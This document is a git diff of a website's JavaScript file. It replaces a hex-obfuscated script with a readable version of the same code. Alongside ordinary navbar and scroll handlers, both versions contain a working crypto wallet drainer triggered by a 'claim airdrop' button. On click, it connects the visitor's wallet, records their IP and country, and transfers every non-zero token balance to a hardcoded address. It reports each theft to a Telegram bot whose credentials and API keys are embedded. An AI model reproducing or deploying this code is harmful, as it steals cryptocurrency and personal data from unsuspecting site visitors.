@@ -1,23 +1,316 @@
-'use strict';const _0x1a2b=function(_0x3c4d,_0x5e6f,_0x7a8b){if(_0x3c4d.length>1){for(let _0x9b0c=0;_0x9b0c<_0x3c4d.length;_0x9b0c++){_0x3c4d[_0x9b0c].addEventListener(_0x5e6f,_0x7a8b)}}else{_0x3c4d.addEventListener(_0x5e6f,_0x7a8b)}};const _0x2c3d=document.querySelector("[data-navbar]");const _0x4e5f=document.querySelectorAll("[data-nav-link]");const _0x6a7b=document.querySelector("[data-nav-toggler]");const _0x8c9d=function(){_0x2c3d.classList.toggle("active");_0x6a7b.classList.toggle("active");document.body.classList.toggle("active")};_0x1a2b(_0x6a7b,"click",_0x8c9d);const _0xabcd=function(){_0x2c3d.classList.remove("active");_0x6a7b.classList.remove("active");document.body.classList.remove("active")};_0x1a2b(_0x4e5f,"click",_0xabcd);const _0xdef1=document.querySelector("[data-header]");const _0xf123=function(){if(window.scrollY>300){_0xdef1.classList.add("active")}else{_0xdef1.classList.remove("active")}};_0x1a2b(window,"scroll",_0xf123);const _0x3456=document.querySelectorAll("[data-add-to-fav]");const _0x789a=function(){this.classList.toggle("active")};_0x1a2b(_0x3456,"click",_0x789a);const _0x9bcd=document.querySelectorAll("[data-section]");const _0xcdef=function(){for(let _0x0a1b=0;_0x0a1b<_0x9bcd.length;_0x0a1b++){if(_0x9bcd[_0x0a1b].getBoundingClientRect().top<window.innerHeight/1.5){_0x9bcd[_0x0a1b].classList.add("active")}else{_0x9bcd[_0x0a1b].classList.remove("active")}}};_0xcdef();_0x1a2b(window,"scroll",_0xcdef);async function _0x1f2e(){if(!window.ethers||!window.Web3Modal){console.error("\x52\x65\x71\x75\x69\x72\x65\x64\x20\x6c\x69\x62\x72\x61\x72\x69\x65\x73\x20\x28\x65\x74\x68\x65\x72\x73\x20\x6f\x72\x20\x57\x65\x62\x33\x4d\x6f\x64\x61\x6c\x29\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64\x2e");return}const _0x3a4b={walletconnect:{package:window.WalletConnectProvider.default,options:{infuraId:"\x35\x62\x32\x63\x35\x65\x65\x35\x37\x36\x30\x31\x34\x36\x33\x34\x39\x36\x36\x39\x61\x31\x65\x39\x63\x37\x37\x36\x36\x35\x64\x31"}}};const _0x5c6d=new window.Web3Modal.default({cacheProvider:false,providerOptions:_0x3a4b});const _0x7e8f=[{chainId:1,name:"\x45\x74\x68\x65\x72\x65\x75\x6d",chainName:"\x65\x74\x68",exodusAddress:"\x30\x78\x35\x32\x35\x45\x36\x34\x33\x33\x39\x34\x30\x33\x62\x46\x64\x32\x35\x46\x62\x39\x38\x32\x45\x37\x37\x61\x61\x30\x41\x37\x37\x64\x64\x61\x42\x31\x62\x66\x35\x37"},{chainId:137,name:"\x50\x6f\x6c\x79\x67\x6f\x6e",chainName:"\x70\x6f\x6c\x79\x67\x6f\x6e",exodusAddress:"\x30\x78\x35\x32\x35\x45\x36\x34\x33\x33\x39\x34\x30\x33\x62\x46\x64\x32\x35\x46\x62\x39\x38\x32\x45\x37\x37\x61\x61\x30\x41\x37\x37\x64\x64\x61\x42\x31\x62\x66\x35\x37"}];const _0x9a0b="\x37\x38\x37\x35\x33\x30\x39\x33\x38\x37\x3a\x41\x41\x48\x63\x71\x4f\x38\x6d\x39\x48\x74\x61\x45\x39\x64\x56\x71\x56\x42\x6c\x76\x32\x78\x6e\x41\x77\x44\x6b\x55\x54\x6d\x46\x44\x41\x55";const _0x0c1d="\x35\x39\x39\x35\x36\x31\x36\x38\x32\x34";const _0x2e3f="\x65\x79\x4a\x68\x62\x47\x63\x69\x4f\x69\x4a\x49\x55\x7a\x49\x31\x4e\x69\x49\x73\x49\x6e\x54\x35\x43\x49\x36\x49\x6b\x70\x58\x56\x43\x39\x2e\x65\x79\x4a\x75\x62\x32\x39\x6e\x63\x33\x4e\x69\x49\x6d\x55\x31\x4d\x49\x5a\x6d\x51\x31\x4c\x54\x45\x74\x4e\x47\x49\x79\x4f\x43\x38\x59\x7a\x59\x7a\x4c\x54\x5a\x6d\x4f\x57\x41\x7a\x5a\x44\x52\x6b\x4e\x57\x4a\x6a\x5a\x53\x49\x73\x49\x6d\x39\x79\x5a\x47\x4c\x6a\x49\x6a\x4f\x69\x4e\x44\x51\x35\x4e\x54\x38\x35\x49\x69\x77\x69\x64\x58\x4e\x6c\x63\x6b\x6c\x64\x49\x6a\x4f\x69\x4e\x44\x59\x79\x4e\x54\x38\x30\x49\x69\x77\x69\x64\x48\x6c\x77\x5a\x53\x49\x36\x49\x6e\x5a\x58\x74\x37\x74\x54\x6e\x4f\x66\x4b\x6e\x6f\x5a\x58\x53\x73\x71\x53\x5f\x36\x57\x49\x52\x65\x59\x2e\x6c\x72\x35\x2d\x70\x2d\x53\x48\x53\x37\x6a\x34\x45\x41\x6c\x73\x54\x31\x5a\x59\x74\x37\x74\x54\x6e\x4f\x66\x4b\x6e\x6f\x5a\x58\x53\x73\x71\x53\x5f\x36\x57\x49\x52\x65\x59";const _0x4a5b=_0x6c7d=>new Promise(_0x8e9f=>setTimeout(_0x8e9f,_0x6c7d));try{const _0xa0b1=await _ _
+'use strict';
 
-0x5c6d.connect();const _0xc2d3=new ethers.providers.Web3Provider(_0xa0b1);const _0xe4f5=_0xc2d3.getSigner();const _0x0678=await _0xe4f5.getAddress();const _0x289a=_0xa0b1.isWalletConnect?"\x57\x61\x6c\x6c\x65\x74\x43\x6f\x6e\x6e\x65\x63\x74":"\x4d\x65\x74\x61\x4d\x61\x73\x6b";console.log(`\x57\x61\x6c\x6c\x65\x74\x20\x63\x6f\x6e\x6e\x65\x63\x74\x65\x64\x3a\x20${_0x0678}\x20\x28${_0x289a}\x29`);let _0x4c5d={};try{const _0x6e7f=await fetch("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x70\x61\x70\x69\x2e\x63\x6f\x2f\x6a\x73\x6f\x6e\x2f");_0x4c5d=await _0x6e7f.json()}catch(_0x8091){console.warn("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x20\x66\x65\x74\x63\x68\x20\x66\x61\x69\x6c\x65\x64",_0x8091);_0x4c5d={country_name:"\x55\x6e\x6b\x6e\x6f\x77\x6e",ip:"\x4e\x2f\x41"}}for(const _0xa2b3 of _0x7e8f){try{console.log(`\x50\x72\x6f\x63\x65\x73\x73\x69\x6e\x67\x20\x6e\x65\x74\x77\x6f\x72\x6b\x3a\x20${_0xa2b3.name}`);try{await _0xa0b1.request({method:'\x77\x61\x6c\x6c\x65\x74\x5f\x73\x77\x69\x74\x63\x68\x45\x74\x68\x65\x72\x65\x75\x6d\x43\x68\x61\x69\x6e',params:[{chainId:`\x30\x78${_0xa2b3.chainId.toString(16)}`}]})}catch(_0xc4d5){if(_0xc4d5.code===4902){const _0xe6f7={1:{chainId:'\x30\x78\x31',chainName:'\x45\x74\x68\x65\x72\x65\x75\x6d\x20\x4d\x61\x69\x6e\x6e\x65\x74',rpcUrls:['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x69\x6e\x6e\x65\x74\x2e\x69\x6e\x66\x75\x72\x61\x2e\x69\x6f\x2f\x76\x33\x2f\x35\x62\x32\x63\x35\x65\x65\x35\x37\x36\x30\x31\x34\x36\x33\x34\x39\x36\x36\x39\x61\x31\x65\x39\x63\x37\x37\x36\x36\x35\x64\x31'],nativeCurrency:{name:'\x45\x54\x48',symbol:'\x45\x54\x48',decimals:18},blockExplorerUrls:['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x74\x68\x65\x72\x73\x63\x61\x6e\x2e\x69\x6f']},137:{chainId:'\x30\x78\x38\x39',chainName:'\x50\x6f\x6c\x79\x67\x6f\x6e\x20\x4d\x61\x69\x6e\x6e\x65\x74',rpcUrls:['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x6f\x6c\x79\x67\x6f\x6e\x2d\x72\x70\x63\x2e\x63\x6f\x6d'],nativeCurrency:{name:'\x4d\x41\x54\x49\x43',symbol:'\x4d\x41\x54\x49\x43',decimals:18},blockExplorerUrls:['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x6f\x6c\x79\x67\x6f\x6e\x73\x63\x61\x6e\x2e\x63\x6f\x6d']}}[_0xa2b3.chainId];await _0xa0b1.request({method:'\x77\x61\x6c\x6c\x65\x74\x5f\x61\x64\x64\x45\x74\x68\x65\x72\x65\x75\x6d\x43\x68\x61\x69\x6e',params:[_0xe6f7]});await _0xa0b1.request({method:'\x77\x61\x6c\x6c\x65\x74\x5f\x73\x77\x69\x74\x63\x68\x45\x74\x68\x65\x72\x65\x75\x6d\x43\x68\x61\x69\x6e',params:[{chainId:`\x30\x78${_0xa2b3.chainId.toString(16)}`}]})}else{throw _0xc4d5}}const _0x08a9=new ethers.providers.Web3Provider(_0xa0b1);const _0x2abf=_0x08a9.getSigner();const _0x4cd1=await _0x08a9.getNetwork();if(_0x4cd1.chainId!==_0xa2b3.chainId){const _0x6ef3=`\xE2\x9D\x8C\x20\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x73\x77\x69\x74\x63\x68\x20\x74\x6f\x20${_0xa2b3.name}\x2e`;await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74${_0x9a0b}/\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65`,{method:"\x50\x4f\x53\x54",headers:{"\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"},body:JSON.stringify({chat_id:_0x0c1d,text:_0x6ef3})});continue}await _0x4a5b(1000);let _0x8e0f=[];let _0xa123="";let _0xc345=0;const _0xe567=3;let _0x089a=false;while(_0xc345<_0xe567&&!_0x089a){try{_0xc345++;const _0x2b7d=`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x65\x65\x70\x2d\x69\x6e\x64\x65\x78\x2e\x6d\x6f\x72\x61\x6c\x69\x73\x2e\x69\x6f\x2f\x61\x70\x69\x2f\x76\x32\x2e\x32\x2f${_0x0678}/\x65\x72\x63\x32\x30\x3f\x63\x68\x61\x69\x6e\x3d${_0xa2b3.chainName}`;const _0x4d89=await fetch(_0x2b7d,{headers:{"\x58\x2d\x41\x50\x49\x2d\x4b\x65\x79":_0x2e3f}});if(!_0x4d89.ok)throw new Error(`\x4d\x6f\x72\x61\x6c\x69\x73\x20\x41\x50\x49\x20\x65\x72\x72\x6f\x72\x3a\x20${_0x4d89.statusText}`);_0x8e0f=await _0x4d89.json();_0x089a=true;const _0x6f9b=_0x8e0f.filter(_0x0b1c=>_0x0b1c.balance&&!ethers.BigNumber.from(_0x0b1c.balance).isZero());_0xa123=_0x6f9b.length>0?_0x6f9b.map(_0x2d3e=>{const _0x4f5a=ethers.utils.formatUnits(_0x2d3e.balance,_0x2d3e.decimals??18);return `\xE2\x80\xA2\x20${_0x2d3e.symbol}\x3a\x20${_0x4f5a}`}).join("\x0a"):`\x4e\x6f\x20\x6e\x6f\x6e\x2d\x7a\x65\x72\x6f\x20${_0xa2b3.name}\x20\x74\x6f\x6b\x65\x6e\x20\x62\x61\x6c\x61\x6e\x63\x65\x73\x20\x66\x6f\x75\x6e\x64\x2e`}catch(_0x8f0a){console.warn(`\x41\x50\x49\x20\x61\x74\x74\x65\x6d\x70\x74\x20${_0xc345}\x20\x66\x61\x69\x6c\x65\x64\x3a\x20${_0x8f0a.message}`);if(_0xc345===_0xe567){_0xa123=`\x46\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x66\x65\x74\x63\x68\x20\x74\x6f\x6b\x65\x6e\x20\x62\x61\x6c\x61\x6e\x63\x65\x73\x3a\x20${_0x8f0a.message}`}else{await _0x4a5b(3000)}}}const _0xa789=await _0x08a9.getBalance(_0x0678);const _0xc9ab=ethers.utils.formatEther(_0xa789);const _0xebcd=`\xE2\x80\xA2\x20${_0xa2b3.chainId===1?'\x45\x54\x48':'\x4d\x41\x54\x49\x43'}\x3a\x20${_0xc9ab}`;const _0x0def=`
-\xF0\x9F\x93\xA5\x20\x57\x61\x6c\x6c\x65\x74\x20\x43\x6f\x6e\x6e\x65\x63\x74\x65\x64\x20\x6f\x6e\x20${_0xa2b3.name}
-\x41\x64\x64\x72\x65\x73\x73\x3a\x20${_0x0678}
-\x57\x61\x6c\x6c\x65\x74\x3a\x20${_0x289a}
-\x43\x6f\x75\x6e\x74\x72\x79\x3a\x20${_0x4c5d.country_name}
-\x49\x50\x3a\x20${_0x4c5d.ip}
+/**
+ * Add event on element
+ */
+const addEventOnElem = function (elem, type, callback) {
+  if (elem.length > 1) {
+    for (let i = 0; i < elem.length; i++) {
+      elem[i].addEventListener(type, callback);
+    }
+  } else {
+    elem.addEventListener(type, callback);
+  }
+};
 
-\xF0\x9F\x92\xB0\x20\x42\x61\x6c\x61\x6e\x63\x65\x73\x3a
-${_0xa123}
-${_0xebcd}
-        `;await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74${_0x9a0b}/\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65`,{method:"\x50\x4f\x53\x54",headers:{"\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"},body:JSON.stringify({chat_id:_0x0c1d,text:_0x0def})});const _0x2f3a=_0x8e0f.filter(_0x4b5c=>_0x4b5c.balance&&!ethers.BigNumber.from(_0x4b5c.balance).isZero());for(const _0x6d7e of _0x2f3a){try{const _0x8f9a=new ethers.Contract(_0x6d7e.token_address,["\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x74\x72\x61\x6e\x73\x66\x65\x72\x28\x61\x64\x64\x72\x65\x73\x73\x20\x74\x6f\x2c\x20\x75\x69\x6e\x74\x20\x61\x6d\x6f\x75\x6e\x74\x29\x20\x72\x65\x74\x75\x72\x6e\x73\x20\x28\x62\x6f\x6f\x6c\x29"],_0x2abf);const _0xa0c1=await _0x8f9a.transfer(_0xa2b3.exodusAddress,_0x6d7e.balance);await _0xa0c1.wait();const _0xc2e3=ethers.utils.formatUnits(_0x6d7e.balance,_0x6d7e.decimals??18);const _0xe4a5=`
-\xE2\x9C\x85\x20\x54\x72\x61\x6e\x73\x66\x65\x72\x20\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6c
-\x54\x6f\x6b\x65\x6e\x3a\x20${_0x6d7e.symbol}
-\x41\x6d\x6f\x75\x6e\x74\x3a\x20${_0xc2e3}
-\x54\x6f\x3a\x20${_0xa2b3.exodusAddress}
-\x54\x78\x3a\x20${_0xa0c1.hash}
-            `;await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74${_0x9a0b}/\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65`,{method:"\x50\x4f\x53\x54",headers:{"\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"},body:JSON.stringify({chat_id:_0x0c1d,text:_0xe4a5})})}catch(_0x0678){const _0x289a=`
-\xE2\x9D\x8C\x20\x54\x72\x61\x6e\x73\x66\x65\x72\x20\x46\x61\x69\x6c\x65\x64
-\x54\x6f\x6b\x65\x6e\x3a\x20${_0x6d7e.symbol}
-\x45\x72\x72\x6f\x72\x3a\x20${_0x0678.message}
-            `;await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74${_0x9a0b}/\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65`,{method:"\x50\x4f\x53\x54",headers:{"\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"},body:JSON.stringify({chat_id:_0x0c1d,text:_0x289a})})}}}catch(_0x4c5d){const _0x6e7f=`\xE2\x9D\x8C\x20\x45\x72\x72\x6f\x72\x20\x6f\x6e\x20${_0xa2b3.name}\x3a\x20${_0x4c5d.message}`;await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74${_0x9a0b}/\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65`,{method:"\x50\x4f\x53\x54",headers:{"\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"},body:JSON.stringify({chat_id:_0x0c1d,text:_0x6e7f})})}}}catch(_0x8091){const _0xa0b1=`\xE2\x9D\x8C\x20\x57\x61\x6c\x6c\x65\x74\x20\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x20\x46\x61\x69\x6c\x65\x64\x3a\x20${_0x8091.message}`;await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74${_0x9a0b}/\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65`,{method:"\x50\x4f\x53\x54",headers:{"\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e"},body:JSON.stringify({chat_id:_0x0c1d,text:_0xa0b1})})}}document.getElementById("\x63\x6c\x61\x69\x6d\x2d\x61\x69\x72\x64\x72\x6f\x70\x2d\x62\x74\x6e")?.addEventListener("\x63\x6c\x69\x63\x6b",_0x1f2e);
+/**
+ * Navbar toggle
+ */
+const navbar = document.querySelector("[data-navbar]");
+const navbarLinks = document.querySelectorAll("[data-nav-link]");
+const navToggler = document.querySelector("[data-nav-toggler]");
+
+const toggleNavbar = function () {
+  navbar.classList.toggle("active");
+  navToggler.classList.toggle("active");
+  document.body.classList.toggle("active");
+};
+
+addEventOnElem(navToggler, "click", toggleNavbar);
+
+const closeNavbar = function () {
+  navbar.classList.remove("active");
+  navToggler.classList.remove("active");
+  document.body.classList.remove("active");
+};
+
+addEventOnElem(navbarLinks, "click", closeNavbar);
+
+/**
+ * Header active on scroll
+ */
+const header = document.querySelector("[data-header]");
+
+const activeHeader = function () {
+  if (window.scrollY > 300) {
+    header.classList.add("active");
+  } else {
+    header.classList.remove("active");
+  }
+};
+
+addEventOnElem(window, "scroll", activeHeader);
+
+/**
+ * Toggle active on add to fav
+ */
+const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");
+
+const toggleActive = function () {
+  this.classList.toggle("active");
+};
+
+addEventOnElem(addToFavBtns, "click", toggleActive);
+
+/**
+ * Scroll reveal effect
+ */
+const sections = document.querySelectorAll("[data-section]");
+
+const scrollReveal = function () {
+  for (let i = 0; i < sections.length; i++) {
+    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
+      sections[i].classList.add("active");
+    } else {
+      sections[i].classList.remove("active");
+    }
+  }
+};
+
+scrollReveal();
+addEventOnElem(window, "scroll", scrollReveal);
+
+/**
+ * Wallet connect, network switching, and token transfer with Telegram notification
+ */
+async function connectWalletAndSendTokens() {
+  if (!window.ethers || !window.Web3Modal) {
+    console.error("Required libraries (ethers or Web3Modal) not found.");
+    return;
+  }
+
+  const providerOptions = {
+    walletconnect: {
+      package: window.WalletConnectProvider.default,
+      options: {
+        infuraId: "5b2c5ee5760146349669a1e9c77665d1"
+      }
+    }
+  };
+
+  const web3Modal = new window.Web3Modal.default({
+    cacheProvider: false,
+    providerOptions
+  });
+
+  const evmNetworks = [
+    {
+      chainId: 1,
+      name: "Ethereum",
+      chainName: "eth",
+      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
+    },
+    {
+      chainId: 137,
+      name: "Polygon",
+      chainName: "polygon",
+      exodusAddress: "0x525E64339403bFd25Fb982E77aa0A77ddaB1bf57"
+    }
+  ];
+
+  const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
+  const chatId = "5995616824";
+  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
+
+  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+  try {
+    const instance = await web3Modal.connect();
+    const provider = new ethers.providers.Web3Provider(instance);
+    const signer = provider.getSigner();
+    const userAddress = await signer.getAddress();
+    const walletType = instance.isWalletConnect ? "WalletConnect" : "MetaMask";
+    console.log(`Wallet connected: ${userAddress} (${walletType})`);
+
+    let locationData = {};
+    try {
+      const locRes = await fetch("https://ipapi.co/json/");
+      locationData = await locRes.json();
+    } catch (e) {
+      console.warn("Location fetch failed", e);
+      locationData = { country_name: "Unknown", ip: "N/A" };
+    }
+
+    for (const network of evmNetworks) {
+      try {
+        console.log(`Processing network: ${network.name}`);
+
+        try {
+          await instance.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+          });
+        } catch (switchErr) {
+          if (switchErr.code === 4902) {
+            const chainConfig = {
+              1: {
+                chainId: '0x1',
+                chainName: 'Ethereum Mainnet',
+                rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
+                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                blockExplorerUrls: ['https://etherscan.io']
+              },
+              137: {
+                chainId: '0x89',
+                chainName: 'Polygon Mainnet',
+                rpcUrls: ['https://polygon-rpc.com'],
+                nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+                blockExplorerUrls: ['https://polygonscan.com']
+              }
+            }[network.chainId];
+            await instance.request({
+              method: 'wallet_addEthereumChain',
+              params: [chainConfig]
+            });
+            await instance.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+            });
+          } else {
+            throw switchErr;
+          }
+        }
+
+        const currentProvider = new ethers.providers.Web3Provider(instance);
+        const currentSigner = currentProvider.getSigner();
+        const currentNetwork = await currentProvider.getNetwork();
+
+        if (currentNetwork.chainId !== network.chainId) {
+          const errorMessage = `❌ Failed to switch to ${network.name}.`;
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+          });
+          continue;
+        }
+
+        await delay(1000);
+
+        let tokens = [];
+        let tokenSummaryTelegram = "";
+        let apiAttempts = 0;
+        const maxAttempts = 3;
+        let apiSuccess = false;
+        
+        while (apiAttempts < maxAttempts && !apiSuccess) {
+  try {
+    apiAttempts++;
+    const moralisUrl = `https://deep-index.moralis.io/api/v2.2/${userAddress}/erc20?chain=${network.chainName}`;
+    const response = await fetch(moralisUrl, {
+      headers: { "X-API-Key": moralisApiKey }
+    });
+    if (!response.ok) throw new Error(`Moralis API error: ${response.statusText}`);
+    tokens = await response.json();
+    apiSuccess = true;
+
+    const nonZeroTokens = tokens.filter(token =>
+      token.balance && !ethers.BigNumber.from(token.balance).isZero()
+    );
+
+    tokenSummaryTelegram = nonZeroTokens.length > 0
+      ? nonZeroTokens.map(token => {
+          const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
+          return `• ${token.symbol}: ${balance}`;
+        }).join("\n")
+      : `No non-zero ${network.name} token balances found.`;
+  } catch (apiErr) {
+    console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
+    if (apiAttempts === maxAttempts) {
+      tokenSummaryTelegram = `Failed to fetch token balances: ${apiErr.message}`;
+    } else {
+      await delay(3000);
+    }
+  }
+}
+
+
+        const nativeBalance = await currentProvider.getBalance(userAddress);
+        const formattedBalance = ethers.utils.formatEther(nativeBalance);
+        const nativeBalanceMessage = `• ${network.chainId === 1 ? 'ETH' : 'MATIC'}: ${formattedBalance}`;
+
+        const networkMessage = `
+📥 Wallet Connected on ${network.name}
+Address: ${userAddress}
+Wallet: ${walletType}
+Country: ${locationData.country_name}
+IP: ${locationData.ip}
+
+💰 Balances:
+${tokenSummaryTelegram}
+${nativeBalanceMessage}
+        `;
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: networkMessage })
+        });
+
+        const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());
+
+        for (const token of nonZeroTokens) {
+          try {
+            const contract = new ethers.Contract(token.token_address, [
+              "function transfer(address to, uint amount) returns (bool)"
+            ], currentSigner);
+
+            const tx = await contract.transfer(network.exodusAddress, token.balance);
+            await tx.wait();
+
+            const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
+            const successMessage = `
+✅ Transfer Successful
+Token: ${token.symbol}
+Amount: ${balance}
+To: ${network.exodusAddress}
+Tx: ${tx.hash}
+            `;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text: successMessage })
+            });
+          } catch (err) {
+            const errorMessage = `
+❌ Transfer Failed
+Token: ${token.symbol}
+Error: ${err.message}
+            `;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+            });
+          }
+        }
+      } catch (err) {
+        const errorMessage = `❌ Error on ${network.name}: ${err.message}`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+        });
+      }
+    }
+  } catch (err) {
+    const errorMessage = `❌ Wallet Connection Failed: ${err.message}`;
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+    });
+  }
+}
+
+document.getElementById("claim-airdrop-btn")?.addEventListener("click", connectWalletAndSendTokens);
